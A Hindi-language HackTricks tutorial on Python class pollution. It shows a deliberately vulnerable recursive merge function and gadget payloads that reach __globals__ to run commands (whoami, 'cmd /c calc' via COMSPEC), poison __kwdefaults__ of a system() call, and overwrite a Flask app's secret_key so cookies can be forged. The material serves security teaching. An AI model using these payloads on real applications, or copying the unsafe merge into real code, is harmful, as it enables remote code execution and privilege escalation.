# क्लास प्रदूषण (Python का प्रोटोटाइप प्रदूषण)

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी उदाहरण

जांचें कि कैसे स्ट्रिंग्स के साथ ऑब्जेक्ट्स की क्लासेस को प्रदूषित करना संभव है:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## बुनियादी कमजोरियों का उदाहरण
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## गैजेट उदाहरण

<details>

<summary>क्लास प्रॉपर्टी डिफ़ॉल्ट मान को RCE (सबप्रोसेस) में बनाना</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>अन्य कक्षाओं और वैश्विक वेरिएबल्स को <code>globals</code> के माध्यम से प्रदूषित करना</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>मनमाने उपप्रक्रिया निष्पादन</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** सभी फ़ंक्शनों का एक विशेष गुण है, जो Python [documentation](https://docs.python.org/3/library/inspect.html) के आधार पर, यह “**कीवर्ड-केवल** पैरामीटर के लिए किसी भी डिफ़ॉल्ट मान का मैपिंग” है। इस गुण को प्रदूषित करना हमें एक फ़ंक्शन के कीवर्ड-केवल पैरामीटर के डिफ़ॉल्ट मानों को नियंत्रित करने की अनुमति देता है, ये फ़ंक्शन के पैरामीटर हैं जो \* या \*args के बाद आते हैं।
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>फाइलों के बीच Flask गुप्त को ओवरराइट करना</summary>

तो, यदि आप वेब के मुख्य पायथन फ़ाइल में परिभाषित एक ऑब्जेक्ट पर एक क्लास प्रदूषण कर सकते हैं लेकिन **जिसकी क्लास मुख्य फ़ाइल से अलग फ़ाइल में परिभाषित है**। क्योंकि पिछले पेलोड में \_\_globals\_\_ तक पहुँचने के लिए आपको ऑब्जेक्ट की क्लास या क्लास के तरीकों तक पहुँचने की आवश्यकता है, आप **उस फ़ाइल में ग्लोबल्स तक पहुँच पाएंगे, लेकिन मुख्य फ़ाइल में नहीं**। \
इसलिए, आप **Flask ऐप के ग्लोबल ऑब्जेक्ट तक पहुँचने में असमर्थ होंगे** जिसने मुख्य पृष्ठ पर **गुप्त कुंजी** को परिभाषित किया:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस परिदृश्य में, आपको फ़ाइलों को पार करने के लिए एक गैजेट की आवश्यकता है ताकि मुख्य फ़ाइल तक पहुँच सकें और **वैश्विक ऑब्जेक्ट `app.secret_key`** तक पहुँच सकें ताकि Flask गुप्त कुंजी को बदल सकें और इस कुंजी को जानकर [**अधिकार बढ़ा सकें**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

इस तरह का एक पेलोड [इस लेख से](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
इस पेलोड का उपयोग करें **`app.secret_key`** (आपके ऐप में नाम अलग हो सकता है) को बदलने के लिए ताकि नए और अधिक विशेषाधिकार प्राप्त फ्लास्क कुकीज़ पर हस्ताक्षर किया जा सके।

</details>

अधिक पढ़ने के लिए निम्नलिखित पृष्ठ को भी देखें:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## संदर्भ

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
